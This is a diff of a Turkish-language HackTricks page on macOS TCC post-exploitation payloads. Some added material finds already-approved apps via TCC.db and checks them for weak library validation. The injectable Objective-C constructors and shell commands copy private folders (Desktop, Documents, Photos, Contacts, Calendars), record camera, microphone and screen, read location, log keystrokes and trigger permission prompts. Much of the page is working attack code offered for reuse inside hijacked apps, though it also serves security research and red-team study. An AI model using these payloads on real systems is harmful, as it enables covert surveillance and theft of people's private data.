@@ -1,23 +1,35 @@
-# macOS TCC Payloads
+# macOS TCC Payload'ları
 
 {{#include ../../../../banners/hacktricks-training.md}}
 
 > [!TIP]
-> TCC kararları, kaynağı isteyen **işlemin kimliğine** bağlıdır. Post-exploitation sırasında, normal hedef genellikle bu payload'ları **zaten onaylanmış bir app** içine enjekte etmek (veya bunları onun bundle / signature bağlamında çalıştırmak) olur; böylece yeni bir yardımcı çalıştırıp kendi prompt'unu tetiklemekten kaçınılır.
+> TCC kararları, kaynağı isteyen **process'in identity'sine** bağlıdır. Post-exploitation aşamasında genel amaç, yeni bir helper çalıştırıp kendi prompt'unu tetiklemek yerine bu payload'ları **önceden onaylanmış bir app'e** inject etmek (veya bunları app'in bundle'ı / signature context'i içinde başka bir şekilde çalıştırmak) olur.
 >
-> **Screen Recording**, **Input Monitoring** ve **synthetic input** için, modern macOS ayrıca `CGPreflightScreenCaptureAccess`, `CGRequestScreenCaptureAccess`, `CGRequestListenEventAccess` ve `CGRequestPostEventAccess` gibi açık preflight / request API'leri sunar.
+> **Screen Recording**, **Input Monitoring** ve **synthetic input** için modern macOS ayrıca `CGPreflightScreenCaptureAccess`, `CGRequestScreenCaptureAccess`, `CGRequestListenEventAccess` ve `CGRequestPostEventAccess` gibi açık preflight / request API'leri de sunar.
 
 > [!WARNING]
-> Bu hâlâ çok gerçekçi bir saldırı yoludur: Microsoft macOS apps'e karşı yapılan yakın tarihli permission-theft araştırması, **zayıf library validation / plugin loading**'in bir saldırganın kurban app'in önceden verilmiş **camera**, **microphone** ve diğer TCC izinlerini ikinci bir prompt olmadan yeniden kullanmasına izin verebileceğini gösterdi.
+> Bu hâlâ oldukça gerçekçi bir attack path'tir: Microsoft macOS app'lerine yönelik yakın tarihli permission-theft araştırması, **weak library validation / plugin loading** mekanizmalarının bir attacker'ın victim app'in önceden verilmiş **camera**, **microphone** ve diğer TCC permission'larını ikinci bir prompt olmadan yeniden kullanmasına olanak sağlayabildiğini gösterdi.
+
+## Bir payload kullanmadan önce hızlı triage
+
+Yakın tarihli permission-theft araştırmaları aynı workflow'u tekrar tekrar doğruluyor: Önce istediğiniz TCC grant'ine zaten sahip bir app bulun, ardından bunun gerçekçi bir injection target olduğunu doğrulayın.
+```bash
+sqlite3 "$HOME/Library/Application Support/com.apple.TCC/TCC.db" \
+"select service, client from access where auth_value=2 and service in ('kTCCServiceCamera','kTCCServiceMicrophone','kTCCServiceScreenCapture','kTCCServiceAccessibility') order by service, client;"
+
+codesign -d --entitlements :- /Applications/Target.app 2>/dev/null | \
+egrep 'disable-library-validation|allow-dyld-environment-variables'
+```
+Hedef ayrıca saldırgan tarafından kontrol edilen plug-in / framework'leri yüklüyorsa, bu payload'lar çok daha ilgi çekici hale gelir. Zaten onaylanmış bir process'in içine girdikten sonraki daha geniş post-exploitation fikirleri için [bu ilgili sayfaya](macos-tcc-credential-and-data-theft.md) bakın.
 
 ### Desktop
 
-- **Entitlement**: None
+- **Entitlement**: Yok
 - **TCC**: kTCCServiceSystemPolicyDesktopFolder
 
 {{#tabs}}
 {{#tab name="ObjetiveC"}}
-`$HOME/Desktop` klasörünü `/tmp/desktop` içine kopyala.
+`$HOME/Desktop` dizinini `/tmp/desktop` konumuna kopyalayın.
 ```objectivec
 #include <syslog.h>
 #include <stdio.h>
@@ -52,7 +64,7 @@ fclose(stderr); // Close the file stream
 {{#endtab}}
 
 {{#tab name="Shell"}}
-`$HOME/Desktop` dizinini `/tmp/desktop` konumuna kopyalayın.
+`$HOME/Desktop` klasörünü `/tmp/desktop` konumuna kopyalayın.
 ```bash
 cp -r "$HOME/Desktop" "/tmp/desktop"
 ```
@@ -61,12 +73,12 @@ cp -r "$HOME/Desktop" "/tmp/desktop"
 
 ### Belgeler
 
-- **Entitlement**: None
+- **Entitlement**: Yok
 - **TCC**: `kTCCServiceSystemPolicyDocumentsFolder`
 
 {{#tabs}}
 {{#tab name="ObjetiveC"}}
-`$HOME/Documents` dizinini `/tmp/documents` konumuna kopyala.
+`$HOME/Documents` konumunu `/tmp/documents` konumuna kopyalayın.
 ```objectivec
 #include <syslog.h>
 #include <stdio.h>
@@ -101,21 +113,21 @@ fclose(stderr); // Close the file stream
 {{#endtab}}
 
 {{#tab name="Shell"}}
-`$HOME/`Documents`i `/tmp/documents` konumuna kopyalayın.
+`$HOME/`Documents öğesini `/tmp/documents` konumuna kopyala.
 ```bash
 cp -r "$HOME/Documents" "/tmp/documents"
 ```
 {{#endtab}}
 {{#endtabs}}
 
-### İndirmeler
+### İndirilenler
 
 - **Entitlement**: None
 - **TCC**: `kTCCServiceSystemPolicyDownloadsFolder`
 
 {{#tabs}}
 {{#tab name="ObjetiveC"}}
-`$HOME/Downloads` dizinini `/tmp/downloads` içine kopyala.
+`$HOME/Downloads` klasörünü `/tmp/downloads` konumuna kopyala.
 ```objectivec
 #include <syslog.h>
 #include <stdio.h>
@@ -150,21 +162,21 @@ fclose(stderr); // Close the file stream
 {{#endtab}}
 
 {{#tab name="Shell"}}
-`$HOME/Dowloads` dizinini `/tmp/downloads` konumuna kopyalayın.
+`$HOME/Dowloads` dizinini `/tmp/downloads` dizinine kopyalayın.
 ```bash
 cp -r "$HOME/Downloads" "/tmp/downloads"
 ```
 {{#endtab}}
 {{#endtabs}}
 
-### Photos Library
+### Fotoğraf Kitaplığı
 
-- **Entitlement**: `com.apple.security.personal-information.photos-library`
+- **Yetki**: `com.apple.security.personal-information.photos-library`
 - **TCC**: `kTCCServicePhotos`
 
 {{#tabs}}
 {{#tab name="ObjetiveC"}}
-`$HOME/Pictures/Photos Library.photoslibrary` dosyasını `/tmp/photos` konumuna kopyalayın.
+`$HOME/Pictures/Photos Library.photoslibrary` konumunu `/tmp/photos` konumuna kopyalayın.
 ```objectivec
 #include <syslog.h>
 #include <stdio.h>
@@ -199,7 +211,7 @@ fclose(stderr); // Close the file stream
 {{#endtab}}
 
 {{#tab name="Shell"}}
-`$HOME/Pictures/Photos Library.photoslibrary` öğesini `/tmp/photos` içine kopyalayın.
+`$HOME/Pictures/Photos Library.photoslibrary` dosyasını `/tmp/photos` konumuna kopyalayın.
 ```bash
 cp -r "$HOME/Pictures/Photos Library.photoslibrary" "/tmp/photos"
 ```
@@ -213,7 +225,7 @@ cp -r "$HOME/Pictures/Photos Library.photoslibrary" "/tmp/photos"
 
 {{#tabs}}
 {{#tab name="ObjetiveC"}}
-`$HOME/Library/Application Support/AddressBook` dizinini `/tmp/contacts` konumuna kopyalayın.
+`$HOME/Library/Application Support/AddressBook` konumunu `/tmp/contacts` konumuna kopyalayın.
 ```objectivec
 #include <syslog.h>
 #include <stdio.h>
@@ -248,21 +260,21 @@ fclose(stderr); // Close the file stream
 {{#endtab}}
 
 {{#tab name="Shell"}}
-`$HOME/Library/Application Support/AddressBook` konumunu `/tmp/contacts` dizinine kopyalayın.
+`$HOME/Library/Application Support/AddressBook` öğesini `/tmp/contacts` konumuna kopyalayın.
 ```bash
 cp -r "$HOME/Library/Application Support/AddressBook" "/tmp/contacts"
 ```
 {{#endtab}}
 {{#endtabs}}
 
-### Calendar
+### Takvim
 
 - **Entitlement**: `com.apple.security.personal-information.calendars`
 - **TCC**: `kTCCServiceCalendar`
 
 {{#tabs}}
 {{#tab name="ObjectiveC"}}
-`$HOME/Library/Calendars` dizinini `/tmp/calendars` konumuna kopyala.
+`$HOME/Library/Calendars` dizinini `/tmp/calendars` konumuna kopyalayın.
 ```objectivec
 #include <syslog.h>
 #include <stdio.h>
@@ -297,21 +309,21 @@ fclose(stderr); // Close the file stream
 {{#endtab}}
 
 {{#tab name="Shell"}}
-`$HOME/Library/Calendars` klasörünü `/tmp/calendars` içine kopyalayın.
+`$HOME/Library/Calendars` dizinini `/tmp/calendars` konumuna kopyalayın.
 ```bash
 cp -r "$HOME/Library/Calendars" "/tmp/calendars"
 ```
 {{#endtab}}
 {{#endtabs}}
 
-### Camera
+### Kamera
 
 - **Entitlement**: `com.apple.security.device.camera`
 - **TCC**: `kTCCServiceCamera`
 
 {{#tabs}}
 {{#tab name="ObjetiveC - Record"}}
-3 saniyelik bir video kaydedin ve **`/tmp/recording.mov`** içine kaydedin
+3 saniyelik bir video kaydedin ve **`/tmp/recording.mov`** konumuna kaydedin.
 ```objectivec
 #import <Foundation/Foundation.h>
 #import <AVFoundation/AVFoundation.h>
@@ -422,8 +434,27 @@ fclose(stderr); // Close the file stream
 ```
 {{#endtab}}
 
+{{#tab name="ObjectiveC - Prompt"}}
+Mevcut process hâlâ `NotDetermined` durumundaysa kamera istemini tetikleyin.
+```objectivec
+#import <Foundation/Foundation.h>
+#import <AVFoundation/AVFoundation.h>
+#import <dispatch/dispatch.h>
+__attribute__((constructor))
+static void camprompt(int argc, const char **argv) {
+if ([AVCaptureDevice authorizationStatusForMediaType:AVMediaTypeVideo] != AVAuthorizationStatusNotDetermined) return;
+dispatch_semaphore_t sem = dispatch_semaphore_create(0);
+[AVCaptureDevice requestAccessForMediaType:AVMediaTypeVideo completionHandler:^(BOOL granted) {
+NSLog(@"Camera prompt result: %@", granted ? @"granted" : @"denied");
+dispatch_semaphore_signal(sem);
+}];
+dispatch_semaphore_wait(sem, DISPATCH_TIME_FOREVER);
+}
+```
+{{#endtab}}
+
 {{#tab name="Shell"}}
-Kamera ile bir fotoğraf çek
+Kamerayla bir fotoğraf çekin
 ```bash
 ffmpeg -framerate 30 -f avfoundation -i "0" -frames:v 1 /tmp/capture.jpg
 ```
@@ -437,7 +468,7 @@ ffmpeg -framerate 30 -f avfoundation -i "0" -frames:v 1 /tmp/capture.jpg
 
 {{#tabs}}
 {{#tab name="ObjetiveC - Record"}}
-5 saniyelik sesi kaydet ve bunu `/tmp/recording.m4a` içine depola
+5 saniyelik ses kaydedin ve `/tmp/recording.m4a` konumunda saklayın
 ```objectivec
 #import <Foundation/Foundation.h>
 #import <AVFoundation/AVFoundation.h>
@@ -567,8 +598,27 @@ static void telegram(int argc, const char **argv) {
 ```
 {{#endtab}}
 
+{{#tab name="ObjectiveC - Prompt"}}
+Mevcut process hâlâ `NotDetermined` durumundaysa mikrofon istemini tetikleyin.
+```objectivec
+#import <Foundation/Foundation.h>
+#import <AVFoundation/AVFoundation.h>
+#import <dispatch/dispatch.h>
+__attribute__((constructor))
+static void micprompt(int argc, const char **argv) {
+if ([AVCaptureDevice authorizationStatusForMediaType:AVMediaTypeAudio] != AVAuthorizationStatusNotDetermined) return;
+dispatch_semaphore_t sem = dispatch_semaphore_create(0);
+[AVCaptureDevice requestAccessForMediaType:AVMediaTypeAudio completionHandler:^(BOOL granted) {
+NSLog(@"Microphone prompt result: %@", granted ? @"granted" : @"denied");
+dispatch_semaphore_signal(sem);
+}];
+dispatch_semaphore_wait(sem, DISPATCH_TIME_FOREVER);
+}
+```
+{{#endtab}}
+
 {{#tab name="Shell"}}
-5 saniyelik bir sesi kaydet ve `/tmp/recording.wav` içine kaydet
+5 saniyelik bir ses kaydı al ve `/tmp/recording.wav` konumunda sakla.
 ```bash
 # Check the microphones
 ffmpeg -f avfoundation -list_devices true -i ""
@@ -581,14 +631,14 @@ ffmpeg -f avfoundation -i ":1" -t 5 /tmp/recording.wav
 ### Konum
 
 > [!TIP]
-> Bir uygulamanın konumu alabilmesi için, **Location Services** (Privacy & Security içinden) **etkin olmalıdır,** aksi halde buna erişemez.
+> Bir uygulamanın konumu alabilmesi için Privacy & Security'deki **Konum Servisleri** **etkinleştirilmiş olmalıdır**; aksi takdirde uygulama konuma erişemez.
 
 - **Entitlement**: `com.apple.security.personal-information.location`
 - **TCC**: `/var/db/locationd/clients.plist` içinde verilir
 
 {{#tabs}}
 {{#tab name="ObjectiveC"}}
-Konumu `/tmp/logs.txt` içine yazın
+Konumu `/tmp/logs.txt` dosyasına yazın
 ```objectivec
 #include <syslog.h>
 #include <stdio.h>
@@ -638,7 +688,7 @@ freopen("/tmp/logs.txt", "w", stderr); // Redirect stderr to /tmp/logs.txt
 {{#endtab}}
 
 {{#tab name="Shell"}}
-Geçerli konumu shell'den alın.
+Shell'den mevcut konumu alın.
 ```bash
 # Fast option: use a dedicated CoreLocation CLI helper
 brew install --cask corelocationcli
@@ -648,19 +698,19 @@ CoreLocationCLI --json
 CoreLocationCLI --watch --format '%latitude %longitude %speed %time'
 ```
 > [!TIP]
-> Bu hâlâ **Location Services**’in etkin olmasına ve tool / terminal’in TCC onayı almasına bağlıdır. `CoreLocationCLI` ayrıca çoğu Mac’te Wi-Fi destekli konumlandırmaya dayanır, bu yüzden Wi-Fi devre dışı olduğunda sık sık `kCLErrorDomain error 0` ile sonuçlanır.
+> Bu işlem hâlâ **Konum Servisleri**'nin etkin olmasına ve tool / terminal'ın TCC onayı almasına bağlıdır. `CoreLocationCLI` çoğu Mac'te Wi-Fi destekli konumlandırmaya da dayanır; bu nedenle Wi-Fi'ın devre dışı olması genellikle `kCLErrorDomain error 0` ile sonuçlanır.
 
 {{#endtab}}
 {{#endtabs}}
 
-### Screen Recording
+### Ekran Kaydı
 
-- **Entitlement**: None
+- **Yetkilendirme**: Yok
 - **TCC**: `kTCCServiceScreenCapture`
 
 {{#tabs}}
 {{#tab name="ObjectiveC"}}
-Main screen’i `/tmp/screen.mov` içinde 5s boyunca kaydet
+Ana ekranı 5 saniye boyunca `/tmp/screen.mov` konumuna kaydedin
 ```objectivec
 #import <Foundation/Foundation.h>
 #import <AVFoundation/AVFoundation.h>
@@ -718,7 +768,7 @@ freopen("/tmp/logs.txt", "w", stderr); // Redirect stderr to /tmp/logs.txt
 {{#endtab}}
 
 {{#tab name="ObjectiveC - Check / Prompt"}}
-Geçerli sürecin ekranı yakalayıp yakalayamadığını kontrol et ve gerekirse TCC istemini tetikle.
+Mevcut sürecin ekranı yakalayıp yakalayamadığını kontrol eder ve gerekirse TCC istemini tetikler.
 ```objectivec
 #import <Foundation/Foundation.h>
 #import <CoreGraphics/CoreGraphics.h>
@@ -747,14 +797,14 @@ screencapture -V 5 /tmp/screen.mov
 {{#endtabs}}
 
 > [!TIP]
-> **macOS 12.3+** üzerinde, `ScreenCaptureKit` genellikle `AVCaptureScreenInput`’den daha iyi bir post-exploitation primitive’idir: yüksek performanslı streaming yapabilir, `SCScreenshotManager` ile tek kare alabilir ve **system audio** stream edebilir. Eğer ayrıca **microphone** audio da istiyorsanız, yine `kTCCServiceMicrophone` gerekir. Daha fazla desktop-session abuse primitive’i için [bu ilgili sayfaya](../macos-input-monitoring-screen-capture-accessibility.md) bakın.
+> **macOS 12.3+** üzerinde `ScreenCaptureKit`, genellikle `AVCaptureScreenInput`'tan daha iyi bir post-exploitation primitive'idir: yüksek performanslı streaming, `SCScreenshotManager` ile tek karelik görüntü alma ve **system audio** akışı sağlayabilir. Son `ScreenCaptureKit` güncellemeleri ayrıca `SCStreamConfiguration` üzerine `captureMicrophone` / `microphoneCaptureDeviceID` ile doğrudan dosyaya kayıt için `SCRecordingOutput` ekledi. Böylece ele geçirilmiş tek bir screen-capture client, ekranı + system audio'yu doğrudan kaydedebilir ve process ayrıca `kTCCServiceMicrophone` yetkisine sahipse microphone audio ekleyebilir. Daha fazla desktop-session abuse primitive'i için [bu ilgili sayfaya](../macos-input-monitoring-screen-capture-accessibility.md) bakın.
 
-### Accessibility
+### Erişilebilirlik
 
-- **Entitlement**: None
+- **Entitlement**: Yok
 - **TCC**: `kTCCServiceAccessibility`
 
-Finder’ın kontrolünü kabul etmek için TCC privilege’ını kullanın, enter’a basın ve bu şekilde TCC’yi bypass edin
+Finder'ın enter tuşuna basılmasını kontrol etmeyi kabul etmesini sağlamak ve bu şekilde TCC'yi bypass etmek için TCC privilege'ını kullanın.
 
 {{#tabs}}
 {{#tab name="Accept TCC"}}
@@ -810,8 +860,22 @@ return 0;
 ```
 {{#endtab}}
 
+{{#tab name="Check / Prompt"}}
+Mevcut process'in Accessibility için zaten trusted olup olmadığını kontrol eder ve trusted değilse macOS'tan consent UI'yi göstermesini ister.
+```objectivec
+#import <Foundation/Foundation.h>
+#import <ApplicationServices/ApplicationServices.h>
+__attribute__((constructor))
+static void axprompt(int argc, const char **argv) {
+NSDictionary *opts = @{(__bridge id)kAXTrustedCheckOptionPrompt: @YES};
+BOOL trusted = AXIsProcessTrustedWithOptions((__bridge CFDictionaryRef)opts);
+NSLog(@"Accessibility access: %@", trusted ? @"granted" : @"pending/denied");
+}
+```
+{{#endtab}}
+
 {{#tab name="Keylogger"}}
-Basılan tuşları **`/tmp/keystrokes.txt`** içine kaydet
+Basılan tuşları **`/tmp/keystrokes.txt`** içinde saklayın.
 ```objectivec
 #import <Foundation/Foundation.h>
 #import <ApplicationServices/ApplicationServices.h>
@@ -918,17 +982,19 @@ return 0;
 {{#endtab}}
 {{#endtabs}}
 
-> [!CAUTION] > **Accessibility çok güçlü bir izindir**, bunu başka şekillerde de kötüye kullanabilirsin; örneğin, System Events çağırmaya gerek kalmadan doğrudan **keystrokes attack** yapabilirsin.
+> [!CAUTION] > **Erişilebilirlik çok güçlü bir izindir**, bunu başka şekillerde kötüye kullanabilirsiniz; örneğin System Events'i çağırmanız gerekmeksizin yalnızca bununla **keystrokes attack** gerçekleştirebilirsiniz.
 
 > [!TIP]
-> Daha yeni macOS sürümleri, desktop-session abuse’u ayrıca **Input Monitoring** (`kTCCServiceListenEvent`) ve **synthetic input** (`kTCCServicePostEvent`) olarak böler. Keylogging, screen grabs veya AXUIElement automation yerine ham event injection gerekiyorsa, [macOS Input Monitoring, Screen Capture & Accessibility Abuse](../macos-input-monitoring-screen-capture-accessibility.md) bölümüne bak.
+> Daha yeni macOS sürümleri masaüstü oturumu kötüye kullanımını ayrıca **Input Monitoring** (`kTCCServiceListenEvent`) ve **synthetic input** (`kTCCServicePostEvent`) arasında böler. AXUIElement automation yerine keylogging, screen grabs veya raw event injection gerçekleştirmeniz gerekiyorsa [macOS Input Monitoring, Screen Capture & Accessibility Abuse](../macos-input-monitoring-screen-capture-accessibility.md) bölümüne bakın.
 
 
 
-## References
+## Referanslar
 
-- [Cisco Talos - How multiple vulnerabilities in Microsoft apps for macOS pave the way to stealing permissions](https://blog.talosintelligence.com/how-multiple-vulnerabilities-in-microsoft-apps-for-macos-pave-the-way-to-stealing-permissions/)
+- [Cisco Talos - macOS için Microsoft uygulamalarındaki birden fazla güvenlik açığı izinlerin çalınmasının yolunu nasıl açıyor](https://blog.talosintelligence.com/how-multiple-vulnerabilities-in-microsoft-apps-for-macos-pave-the-way-to-stealing-permissions/)
 - [CoreLocationCLI](https://github.com/fulldecent/corelocationcli)
+- [Apple Developer - macOS'ta Media Capture için Authorization isteme](https://developer.apple.com/documentation/bundleresources/requesting-authorization-for-media-capture-on-macos?language=objc)
+- [Apple Developer - ScreenCaptureKit ile HDR içeriği yakalama (WWDC24)](https://developer.apple.com/videos/play/wwdc2024/10088/)
 
 
 {{#include ../../../../banners/hacktricks-training.md}}
